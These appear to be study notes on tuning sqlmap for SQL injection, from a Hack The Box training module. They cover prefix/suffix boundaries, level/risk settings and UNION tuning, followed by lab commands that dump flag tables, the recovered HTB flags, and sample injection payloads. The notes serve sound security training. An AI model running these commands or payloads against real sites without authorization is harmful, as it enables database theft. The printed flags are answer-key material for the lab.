# Attack Tuning

## Prefix/Suffix

Every payload sent to the target consists of:

vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.

boundaries (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

Specify Prefix/Suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

--> enclosure of all vector values between the static prefix %')) and the suffix -- -

## Level/Risk

The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

Compare payloads used withe level=1 vs level=5

sqlmap -u www.example.com/?id=1 -v 3
...SNIP...
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
[14:20:36] [PAYLOAD] 1 AND 7496=4313
[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

sqlmap -u www.example.com/?id=1 -v 3 --level=5
...SNIP...
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
...SNIP...
[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
...SNIP...
[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
...SNIP...
[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'

# Advanced Tuning

Status Codes
--code=200

Titles
--titles

Strings
--string=success

Text-only
--text-only

Techniques of SQLi injection (not time-based for example)
--technique
--technique=BEU

UNION SQLi Tuning
--union-cols=17
Fillnull of columns :
--union-char='a'
--union-from=users

## LAB

### GET PARAMETER

sqlmap -u 'http://94.237.62.195:57826/case5.php?id=1' --batch --dump flag5

ls -l /home/htb-ac-786011/.local/share/sqlmap/output/94.237.62.195/dump/testdb/

sqlmap -u 'http://94.237.62.195:57826/case5.php?id=1'  -v 3 --level=5 --batch --dump flag5

sqlmap -u 'http://94.237.62.195:57826/case5.php?id=1' --prefix="%'))" --suffix="-- -"

sqlmap -u 'http://94.237.62.195:57826/case5.php?id=1' --no-cast --dump -T flag5 --level=5 --risk=3

Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+

### GET PARAMETER PREFIX

sqlmap -u 'http://94.237.62.195:57826/case6.php?col=id' --no-cast --dump -T flag6 --level=5 --risk=3 --prefix='`)'

Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+


### UNION QUERY

id' UNION select 1,@@version,3,4,5-- 


sqlmap -u 'http://94.237.62.195:57826/case7.php?id=1' --union-cols=5 --no-cast --dump -T flag7 

Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+
